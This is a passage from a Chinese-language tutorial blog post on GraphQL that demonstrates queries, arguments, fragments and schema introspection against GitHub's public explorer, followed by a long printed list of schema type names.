<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> me &#123;</span><br><span class="line">   name</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到API按照 指定格式返回JSON数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;me&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;Dorothy&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端也可以作为 GraphQL 查询的一部分来传递参数，如下例所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  human(id: &quot;1000&quot;) &#123;</span><br><span class="line">    name</span><br><span class="line">    location</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;human&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Dorothy,</span><br><span class="line">      &quot;location&quot;: &quot;Kansas&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这里开始，事情变得更加有趣。GraphQL 允许用户定义可复用的片段并分配变量。</p>
<p>假设您需要请求一个 ID 列表，然后为每个 ID 请求一系列记录。借助 GraphQL，您可以构建一个查询，然后通过单个 API 调用来提取所需的所有内容。</p>
<p>查询方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query HeroComparison($first: Int = 3) &#123;</span><br><span class="line">  leftComparison: hero(location: KANSAS) &#123;</span><br><span class="line">    ...comparisonFields</span><br><span class="line">  &#125;</span><br><span class="line">  rightComparison: hero(location: OZ) &#123;</span><br><span class="line">    ...comparisonFields</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fragment comparisonFields on Character &#123;</span><br><span class="line">  name</span><br><span class="line">  friendsConnection(first: $first) &#123;</span><br><span class="line">    totalCount</span><br><span class="line">    edges &#123;</span><br><span class="line">      node &#123;</span><br><span class="line">        name</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>可能生成以下结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;leftComparison&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Dorothy&quot;,</span><br><span class="line">      &quot;friendsConnection&quot;: &#123;</span><br><span class="line">        &quot;totalCount&quot;: 4,</span><br><span class="line">        &quot;edges&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Aunt Em&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Uncle Henry&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Toto&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;rightComparison&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Wizard&quot;,</span><br><span class="line">      &quot;friendsConnection&quot;: &#123;</span><br><span class="line">        &quot;totalCount&quot;: 3,</span><br><span class="line">        &quot;edges&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Scarecrow&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Tin Man&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Lion&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内省"><a href="#内省" class="headerlink" title="内省"></a>内省</h2><p>当我们需要知道GraphQL支持哪些查询时，可通过GraphQL内省系统完成。</p>
<p>练习平台:<a href="https://docs.github.com/cn/graphql/overview/explorer">Explorer - GitHub Docs</a></p>
<h3 id="查询类型"><a href="#查询类型" class="headerlink" title="查询类型"></a>查询类型</h3><p>我们可以通过__schema字段来查询GraphQL哪些类型是可用的，查询的根类型一定是要有类型字段的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __schema &#123; </span><br><span class="line">    types&#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到响应包中返回的类型</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315175431030.png" class title="image-20220315175431030">

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;__schema&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;types&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AbortQueuedMigrationsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AbortQueuedMigrationsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AcceptEnterpriseAdministratorInvitationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AcceptEnterpriseAdministratorInvitationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AcceptTopicSuggestionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AcceptTopicSuggestionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Actor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ActorLocation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ActorType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddAssigneesToAssignableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddAssigneesToAssignablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddEnterpriseSupportEntitlementInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddEnterpriseSupportEntitlementPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddLabelsToLabelableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddLabelsToLabelablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectCardInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectCardPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectColumnInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectColumnPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectNextItemInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectNextItemPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewThreadInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewThreadPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddReactionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddReactionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddStarInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddStarPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddUpvoteInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddUpvotePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddVerifiableDomainInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddVerifiableDomainPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddedToProjectEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;App&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ApproveDeploymentsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ApproveDeploymentsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ApproveVerifiableDomainInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ApproveVerifiableDomainPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ArchiveRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ArchiveRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Assignable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AssignedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Assignee&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AuditEntryActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AuditLogOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AuditLogOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoMergeDisabledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoMergeEnabledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoMergeRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoRebaseEnabledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoSquashEnabledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutomaticBaseChangeFailedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutomaticBaseChangeSucceededEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Base64String&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BaseRefChangedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BaseRefDeletedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BaseRefForcePushedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Blame&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BlameRange&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Blob&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Boolean&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Bot&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchActorAllowanceActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleConflict&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleConflictConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleConflictEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BranchProtectionRuleEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassForcePushAllowance&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassForcePushAllowanceConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassForcePushAllowanceEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassPullRequestAllowance&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassPullRequestAllowanceConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BypassPullRequestAllowanceEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CVSS&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CWE&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CWEConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CWEEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CancelEnterpriseAdminInvitationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CancelEnterpriseAdminInvitationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CancelSponsorshipInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CancelSponsorshipPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ChangeUserStatusInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ChangeUserStatusPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationLevel&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationPosition&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationRange&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckAnnotationSpan&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckConclusionState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRun&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunAction&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunFilter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunOutput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunOutputImage&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckRunType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckStatusState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckStep&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckStepConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckStepEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuite&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuiteAutoTriggerPreference&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuiteConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuiteEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CheckSuiteFilter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClearLabelsFromLabelableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClearLabelsFromLabelablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloneProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloneProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloneTemplateRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloneTemplateRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Closable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloseIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CloseIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClosePullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClosePullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ClosedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Closer&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CodeOfConduct&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CollaboratorAffiliation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Comment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommentAuthorAssociation&quot;</span></span><br><span class="line">        